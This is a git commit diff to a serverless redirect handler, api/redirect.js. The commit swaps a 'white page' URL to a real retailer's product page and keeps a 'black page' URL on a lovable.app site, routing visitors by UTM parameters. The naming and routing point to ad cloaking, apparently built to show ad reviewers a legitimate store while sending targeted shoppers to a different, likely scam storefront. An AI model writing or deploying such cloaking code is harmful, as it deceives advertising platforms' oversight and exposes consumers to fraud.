7507006e3972bfdcdc762b8cd4b625d26e7e4032
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-10 20:37:45 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babyboofashion.com/products/francis-maxi-dress-cherry-lacquer";
+    const whitePageURL = "https://www.kookai.com.au/products/maria-long-cami-coconut-milk";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
